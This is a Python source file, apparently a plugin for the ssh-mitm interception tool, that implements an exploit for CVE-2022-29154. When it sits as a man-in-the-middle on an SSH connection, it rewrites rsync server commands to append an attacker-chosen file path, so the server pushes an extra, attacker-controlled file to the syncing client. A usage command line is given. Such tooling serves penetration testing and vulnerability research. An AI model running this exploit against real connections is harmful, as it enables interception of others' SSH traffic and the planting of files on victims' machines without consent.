"""
This plugin modifies the behavior of the rsync command in SCP. The rsync-inject-file argument
can be specified to add an additional file to the rsync command sent to the server.
The rewritten rsync command is logged for informational purposes.
"""

import logging

from sshmitm.forwarders.scp import SCPForwarder


class CVE202229154(SCPForwarder):
    """Injects an additional file path into rsync commands (CVE-2022-29154).

    When an rsync client syncs files over SSH, this plugin rewrites the rsync
    server command to append an extra file path.  As a result, the rsync server
    sends the attacker-controlled file to the client in addition to the originally
    requested content.

    **Usage example**

    ::

        ssh-mitm server --scp-forwarder CVE-2022-29154 --rsync-inject-file /path/to/inject.txt

    **Notes**

    * Only rsync commands (those starting with ``rsync --server``) are rewritten;
      all other SCP or exec traffic passes through unchanged.
    * The injected file path is appended to the rsync argument list; rsync on the
      server side then includes that path in the transfer.
    """

    @classmethod
    def parser_arguments(cls) -> None:
        plugin_group = cls.argument_group()
        plugin_group.add_argument(
            "--rsync-inject-file",
            dest="rsync_inject_file",
            required=True,
            help="Specifies the path to the file that will be injected into the rsync command sent to the server. This option is required.",
        )

    def rewrite_scp_command(self, command: str) -> str:
        if not command.startswith("rsync --server"):
            return command
        new_command = f"{command}  {self.args.rsync_inject_file}"
        logging.info("replaced rsync command: %s", new_command)
        return new_command
